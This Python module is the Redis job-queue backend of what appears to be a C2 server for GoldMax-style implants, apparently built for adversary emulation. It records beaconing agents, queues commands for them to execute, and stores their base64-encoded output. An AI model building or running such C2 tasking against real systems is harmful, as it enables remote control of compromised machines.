import json
import redis
import docker
import random
import string
import base64
from sys import exit
from datetime import datetime
from colorama import Fore as Color
from typing import Dict

"""
Redis helper functions for managing DB

v.0.0.1

DB Structure:

    Tables:

        (Agents):
            {
                'Agent': Unique UUID,
                'LastCheckIn': TimeStamp,
                'CheckIn': Total number of beacons,
                'C2': Domain for comms
            }

        (Pending / Active / Completed):
            {
                paw: Unique UUID
                cmd: Command for Execution   
            }
"""
# To Do:
# - There should only ever be on Active job for the malware, so make sure we send a new job if there is one Active
# - Once we recv the results, we can use
class RedisDB:
    def __init__(self, conn='localhost'):
        self.active = False
        self.db = None
        self._init(conn)

    @staticmethod
    def find_db():
        """Validate Redis container is running"""
        found = False
        dc = docker.from_env()
        containers = dc.containers.list()
        for container in containers:
            if "GoldMaxDB" in container.attrs["Name"]:
                found = True

        return found

    def connect_db(self):
        """Start Redis container"""

        # If its already running, we are good.
        if self.find_db():
            return
        # Start container if its not active
        dc = docker.from_env()
        dc.containers.run(image="redis:latest", auto_remove=True, name="GoldMaxDB", ports={"6379/tcp": 7001}, detach=True)

        if not self.find_db():
            print(Color.RED + "[-] Failed to connect to redis backend! Expected GoldMaxDB redis container to be active.", Color.RESET)
            exit(-1)

    def _init(self, target_host):
        # Check for redis container
        self.connect_db()
        self.db = redis.Redis(host=target_host, port=7001, db=0)

    @staticmethod
    def id_generator(size=8, chars=string.ascii_uppercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(size))

    def drop_table(self, table):
        """

        :param table:
        :return:
        """

        redis_client = self.db
        try:
            redis_client.delete(table)
        except AssertionError:
            return True

    def update_redis(self, redis_key: str, update_dict: Dict):
        """
        Delete data from redis database and update that key.
        Extract data needed before calling this function
        :return: None
        """
        redis_client = self.db

        redis_client.delete(redis_key)
        redis_client.set(redis_key, json.dumps(update_dict))

    def get_agents(self):
        """
        Queries the Agent Table and returns all active agents
        :return:
        """
        active_agents = {}
        redis_client = self.db
        redis_key = 'Agents'

        if redis_client.get(redis_key):
            active_agents = json.loads(redis_client.get(redis_key).decode())

        return active_agents

    def update_agent(self, agent_name: str, c2):
        """
        Manages the Agent Table for tracking active implants
        :param agent_name:
        :param c2: Store Host specific information
        :param conn: IP address for Redis instance
        :return:
        """
        redis_client = self.db
        redis_key = 'Agents'
        # C2 Domain for Agent
        domain = c2
        time = str(datetime.now())
        holdAgentName = {}
        redis_agents = {}
        count = 0

        if redis_client.get(redis_key):
            redis_agents = json.loads(redis_client.get(redis_key).decode())

            for aKey, aVal in redis_agents.items():
                holdAgentName[aKey] = [aVal['C2'], aVal['Agent']]

            for haKey, haVal in holdAgentName.items():
                count = count + 1
                # Referer is dynamic so check only Host and User-Agent
                #print(f'Checking Agent: {agent_name} vs. {haVal[1]} and Domain: \n\t{domain} \nvs. \n\t{haVal[0]}')
                if (agent_name == haVal[1]) and (haVal[0]["Host"] == domain["Host"]):
                    redis_agents[haKey]['CheckIn'] = int(redis_agents[haKey]['CheckIn']) + 1
                    redis_agents[haKey]['LastCheckIn'] = time
                    break

                elif count == (len(holdAgentName)):
                    # If there are no matches in the database then it is a new agent
                    redis_agents[int(haKey) + 1] = {'Agent': agent_name,
                                                    'LastCheckIn': time,
                                                    'CheckIn': 1,
                                                    'C2': domain
                                                    }

        else:
            # first agent means first entry in the database
            redis_agents[1] = {'Agent': agent_name,
                               'LastCheckIn': time,
                               'CheckIn': 1,
                               'C2': domain
                               }

        self.update_redis(redis_key, redis_agents)

    def get_next_index(self, table):
        """
        Used for tracking next index for inserting new jobs
        :param table:
        :return:
        """
        # Check if we already have jobs
        redis_client = self.db
        jobs = redis_client.get(table)
        # Start index after last known job if any
        try:

            if jobs:
                all_jobs = json.loads(jobs.decode())
                last_index = int(list(all_jobs.keys())[-1])
                count = last_index + 1
                return count
            else:
                return '1'

        except (IndexError, ValueError):

            return '1'

    def get_items(self, table):
        redis_client = self.db
        pending = redis_client.get(table)

        if pending:
            return json.loads(pending.decode())
        else:
            return {}

    def get_last_checkin(self, uuid):
        """
        Get last agent checkin
        """
        agents = self.get_items('Agents')

        for agent in agents.values():
            if agent['Agent'] == uuid:
                return agent['LastCheckIn']

    def _update_table(self, table, jobs):
        """
        Move job from one "Status" to the next phase
        Pending -> Active -> Completed
        :return:
        """
        current_jobs = self.get_items(table)

        # Other jobs found in DB, append new jobs
        if current_jobs:

            for job in jobs.values():
                index = self.get_next_index(table)
                # Add new jobs to the current
                current_jobs.update({index: job})

                self.update_redis(table, current_jobs)

        # No jobs found, insert fresh jobs
        else:
            self.update_redis(table, jobs)

    def get_jobs(self, uuid='None'):
        """
        Extract jobs from Pending and moves to "Active" state in Redis
        :param uuid: Pull jobs related for specific Implant/Agent set.. (GoldMax, SolarEclipse)
        :return:
        """
        redis_client = self.db
        agent_jobs = {}
        active_jobs = {}

        if redis_client.keys('Pending'):
            pending = json.loads(redis_client.get('Pending').decode())
            # The database will be updated with the information in the targets Dictionary.
            for pKey, pVal in pending.items():
                target = pVal['paw']
                if uuid in target:
                    agent_jobs[pKey] = pVal

            if agent_jobs:
                # Move jobs from Pending to Active dictionary
                for hpKey, hpVal in agent_jobs.items():
                    active_jobs[hpKey] = hpVal
                    pending.pop(hpKey)

                # Removes jobs from Pending
                if pending:
                    # if any changes are needed
                    self.update_redis('Pending', pending)
                else:
                    # if there are no more pending jobs delete "Pending" from redis
                    redis_client.delete('Pending')

                # Add jobs to Active table
                self._update_table('Active', active_jobs)

                return active_jobs

    def _find_jobs(self, agent=None, table='Active'):
        """
        Extract specific job for agent
        :param job:
        :return:
        """
        found = []
        jobs = self.get_items(table)

        for index, job in jobs.items():
            if job['paw'] == agent:
                found.append(job)

        return found

    def find_job(self, agent=None, table='Active', cmd=None):
        """
        Default table is Active; Pull all jobs for a specific agent
        :param agent:
        :param table:
        :param cmd:
        :return:
        """

        jobs = self._find_jobs(agent, table)

        for job in jobs:
            return job

    def find_agent(self, domain):
        """
        Find agent based on C2 Domain
        :param domain:
        :return:
        """
        agents = self.get_items('Agents')

        for agent in agents.values():
            if agent['C2'] == domain:
                return agent['Agent']

    def insert_jobs(self, agent: str, job: dict):
        """
        Jobs
        :param agent
        :param job:
        :return: dict
        """

        pending_jobs = self.get_items('Pending')

        index = self.get_next_index('Pending')

        next_job = {index: {'paw': agent,
                            'id': self.id_generator(),
                            'cmd': job
                            }
                    }

        if pending_jobs:
            pending_jobs.update({index: next_job[index]})
            self.update_redis('Pending', pending_jobs)

        else:
            self.update_redis('Pending', next_job)

    def store_job_results(self, agent_name, results):
        """
        Used to update jobs from Active -> Completed and stores results in Redis
        :return:
        """
        redis_client = self.db
        active_jobs = {}
        completed_jobs = {}

        # Validate table exists
        if redis_client.keys('Active'):
            redis_active = json.loads(redis_client.get('Active').decode())

            # Iterate over all active items looking for our specific agent
            for aKey, aVal in redis_active.items():
                target = aVal['paw']    # UniqueId for agent
                if agent_name in target:
                    active_jobs[aKey] = aVal
            # Iterate over found items and store results in Completed table
            for hKey, hVal in active_jobs.items():
                unique_id = hVal["id"]
                # Clean results
                if len(results) > 0x10:
                    results = results[:0x10]
                completed_jobs[unique_id] = {"paw": hVal["paw"],
                                             "id": hVal["id"],
                                             "cmd": hVal["cmd"],
                                             "output": base64.b64encode(results.encode()).decode().strip()
                                             }
                redis_active.pop(hKey)

            # Clean up tables
            if redis_active:
                self.update_redis('Active', redis_active)
            else:
                redis_client.delete('Active')

            # Store results in Completed table
            if redis_client.keys('Completed'):
                redis_complete = json.loads(redis_client.get('Completed').decode())
                # Use JobId as main key
                for hdKey, hdVal in completed_jobs.items():
                    redis_complete[hdKey] = hdVal
                self.update_redis('Completed', redis_complete)
            else:
                redis_client.set('Completed', json.dumps(completed_jobs))
